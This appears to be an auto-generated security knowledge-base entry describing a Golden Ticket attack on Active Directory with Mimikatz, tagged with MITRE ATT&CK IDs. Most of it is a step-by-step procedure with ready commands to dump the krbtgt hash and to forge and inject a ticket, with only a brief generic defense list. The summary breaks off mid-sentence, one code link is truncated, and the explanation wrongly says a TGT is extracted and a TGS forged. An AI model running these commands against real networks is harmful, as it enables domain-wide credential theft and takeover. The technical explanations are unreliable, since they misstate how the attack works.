---
id: c8ad28ee-374e-4ffc-b035-0f74712278f2
name: Golden Ticket Attack with Mimikatz
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:04.712798+00:00'
updated_at: '2023-04-10T20:26:19.904634+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
- '[[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]'
sub_techniques:
- '[[Golden Ticket|T1558.001 - Golden Ticket]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Kerberos Tickets]]'
- '[[Pass-the-Ticket Golden Tickets]]'
- '[[Using Mimikatz]]'
commands:
- '[[Forge a Golden ticket - Mimikatz]]'
- '[[Get info - Mimikatz]]'
- '[[lsadump::trust /patch]]'
- '[[lsadump::dcsync /user:krbtgt]]'
- '[[lsadump::lsa /patch]]'
- '[[kerberos::tgt]]'
- '[[kerberos::golden /user:evil /domain:pentestlab.loc]]'
---

# Golden Ticket Attack with Mimikatz

## Summary

A Golden Ticket attack is a technique used to gain persistent access to a Windows domain. This attack involves compromising the Key Distribution Center (KDC) in a domain, which is responsible for issuing Kerberos tickets. An attacker can use Mimikatz to extract the Kerberos Ticket Granting Ticket (

## Description

# Description

A Golden Ticket attack is a technique used to gain persistent access to a Windows domain. This attack involves compromising the Key Distribution Center (KDC) in a domain, which is responsible for issuing Kerberos tickets. An attacker can use Mimikatz to extract the Kerberos Ticket Granting Ticket (TGT) from memory, and then use this ticket to generate a Golden Ticket. A Golden Ticket allows an attacker to generate valid Kerberos tickets for any user or service in the domain, effectively giving them unrestricted access to the network.

From a technical perspective, the attack involves extracting the TGT from memory using Mimikatz, and then using the TGT to generate a forged ticket-granting service (TGS) ticket. The forged TGS ticket can then be used to authenticate as any user or service in the domain. This attack can be used to move laterally within the network, escalate privileges, and maintain persistence.

From a business perspective, a Golden Ticket attack can be devastating. An attacker with a Golden Ticket can bypass all authentication mechanisms and access any resource in the domain. This can lead to data theft, data destruction, and disruption of business operations.

## Requirements

1. Access to a Windows domain

1. Mimikatz tool

## Defense

1. Implement secure Kerberos configuration settings

1. Monitor Kerberos logs for suspicious activity

1. Implement least privilege access controls

## Objectives

1. Gain persistent access to a Windows domain

1. Move laterally within the network

1. Escalate privileges

# Instructions

1. To perform a Golden Ticket Attack with Mimikatz, follow these steps:

1. Use Mimikatz to extract information about the krbtgt account:
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::trust /patch
lsadump::dcsync /user:krbtgt

2. Purge any existing Kerberos tickets:
kerberos::purge

3. Use Mimikatz to forge a Golden Ticket:
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt

This will create a Golden Ticket for the user 'evil' with administrative privileges on the 'pentestlab.local' domain.

**Code**: [[# Get info - Mimikatz
lsadump::lsa /inject /name:k]]

> The commands used in this attack are:

1. lsadump::lsa /inject /name:krbtgt - This command extracts information about the krbtgt account, which is used to encrypt Kerberos tickets.

2. lsadump::lsa /patch - This command patches the Local Security Authority (LSA) service in memory to allow the extraction of password hashes.

3. lsadump::trust /patch - This command patches the Trust Relationship service in memory to extract trust information.

4. lsadump::dcsync /user:krbtgt - This command simulates a Domain Controller (DC) and requests the password hash for the krbtgt account.

5. kerberos::purge - This command removes any existing Kerberos tickets.

6. kerberos::golden - This command forges a Golden Ticket using the extracted krbtgt account information and grants administrative privileges to the specified user on the specified domain.

**Command** ([[Get info - Mimikatz]]):

```bash
lsadump::lsa /inject /name:krbtgt
```

**Command** ([[lsadump::lsa /patch]]):

```bash
lsadump::lsa /patch
```

**Command** ([[lsadump::trust /patch]]):

```bash
lsadump::trust /patch
```

**Command** ([[lsadump::dcsync /user:krbtgt]]):

```bash
lsadump::dcsync /user:krbtgt
```

**Command** ([[Forge a Golden ticket - Mimikatz]]):

```bash
kerberos::purge
```

**Command** ([[kerberos::golden /user:evil /domain:pentestlab.loc]]):

```bash
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
```

**Command** ([[kerberos::tgt]]):

```bash
kerberos::tgt
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]
- [[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]

### Sub-Techniques

- [[Golden Ticket|T1558.001 - Golden Ticket]]

## Commands Used

- [[Forge a Golden ticket - Mimikatz]]
- [[Get info - Mimikatz]]
- [[lsadump::trust /patch]]
- [[lsadump::dcsync /user:krbtgt]]
- [[lsadump::lsa /patch]]
- [[kerberos::tgt]]
- [[kerberos::golden /user:evil /domain:pentestlab.loc]]

## Tags

- [[Active Directory Attacks]]
- [[Kerberos Tickets]]
- [[Pass-the-Ticket Golden Tickets]]
- [[Using Mimikatz]]
